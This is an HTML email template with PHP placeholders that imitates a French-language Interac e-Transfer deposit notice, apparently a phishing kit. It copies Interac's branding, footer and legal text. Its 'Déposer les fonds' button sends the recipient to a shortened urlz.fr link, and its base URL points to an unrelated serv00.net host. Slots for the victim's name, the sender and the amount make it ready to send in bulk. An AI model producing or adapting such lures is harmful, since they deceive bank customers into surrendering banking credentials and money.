<html><head> <base href="https://marc.serv00.net/">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Interac e-Transfer</title>
<style>
body {
    font-family:  sans-serif;
    margin: 0;
    padding: 0;
    background-color: #eaeced;
    color: #222;
    font-size: 14px;
    line-height: 19px;
}
.container {
    max-width: 580px;
    margin: 0 auto;
    background-color: white;
}
.header {
    background-color: #222;
    padding: 10px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.nav {
    font-size: 12px;
    color: #eee;
}
.nav a {
    color: #eee;
    text-decoration: none;
    margin-left: 10px;
}
.content {
    padding: 20px;
}
h1 {
    font-size: 18px;
    margin-top: 0;
}
.button {
    display: block;
    width: 95%;
    padding: 10px;
    background-color: #f0b51c;
    color: black;
    text-align: center;
    text-decoration: none;
    font-weight: bold;
    border: none;
    margin: 20px 0;
    border-radius: 10px;
    font-size: 18px;
}
.expiry {
    font-size: 14px;
    margin-bottom: 20px;
    text-align: center;
}
.footer {
    font-size: 12px;
    color: #b5b5b5;
    padding: 20px;
    border-top: 1px solid #d9d9d9;
}
.footer a {
    color: #666;
    text-decoration: none;
}
.social-icons {
    display: flex;
    justify-content: center;
    margin-top: 20px;
}
.social-icons img {
    width: 40px;
    height: 40px;
    margin: 0 4px;
}
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo">
            <img src="unnamed.png" alt="INTERAC">
        </div>
        <div class="nav">
            <a href="https://funds.interac.ca/view">Vue navigateur</a> |
            <a href="https://funds.interac.ca/en">English</a> |
            <a href="https://funds.interac.ca/help">?</a>
        </div>
    </div>
    
    <div class="content">
        <strong style="font-size: 20px; font-weight: bold" >Bonjour <?= $client  ?>,</strong>
        
        <p style="font-size: 20px;"> <?= $myname  ?> vous a envoyé  <?= $montant  ?> $ (CAD).</p>
         <br>
         <hr>
        <a  href="https://urlz.fr/rLN1" class="button">Déposer les fonds</a>
        
        <p style="font-size: 18px"  class="expiry"><b>Expire le :</b>  <?= $exp  ?> 2024</p>
        
        <p>Que diriez-vous de déposer des fonds sans avoir à répondre à aucune question? Inscrivez-vous au dépôt automatique du service Virement Interac par votre institution financière - une manière facile et sécuritaire de recevoir des fonds directement dans votre compte bancaire.</p>
    </div>
    
    <div class="footer">
        <a href="https://funds.interac.ca/faq">FAQs</a> |
        <a href="https://funds.interac.ca/security">Cette transaction est securisée</a>
        
        <p>© 2000 - 2022 Interac Corp. Tous droits réservés. <a href="https://help.interac.ca/ca/oon/fr/terms/">Modalités d'utilisation.</a></p>
        <p>MD, Marque d'Interac Corp.</p>
        
        <div class="social-icons">
            <a href="http://twitter.com/interac" target="_blank"><img src="twitter.png" alt="Twitter"></a>
            <a href="https://www.facebook.com/interac" target="_blank"><img src="facebook.png" alt="Facebook"></a>
            <a href="https://www.linkedin.com/company/interac-corp" target="_blank"><img src="linkedin.png" alt="LinkedIn"></a>
            <a href="http://youtube.ca/InteracBrand" target="_blank"><img src="youtube.png" alt="YouTube"></a>
        </div>
        
        <p style="font-size: 10px; color: #b5b5b5;">
            Le destinataire est avisé par courriel ou message texte, et l'institution financière concernée vire les fonds en toute securité par l'entremise des réseaux de paiement déjà établis.
        </p>
        <p style="font-size: 10px; color: #b5b5b5;">
            Ce courriel vous a été envoyé par Interac Corp., propriétaire du service de Virement <i>Interac</i><sup>MD</sup>, au nom de  <?= $client  ?> domicilié(e) à Banque Laurentienne du Canada.
        </p>
        <p style="font-size: 10px; color: #b5b5b5;">
            Interac Corp.<br>
            P.O. Box 45, Toronto, Ontario M5J 2J1<br>
            <a href="http://www.interac.ca/fr" style="color: #666;">www.interac.ca</a>
        </p>
    </div>
</div>
</body>
</html>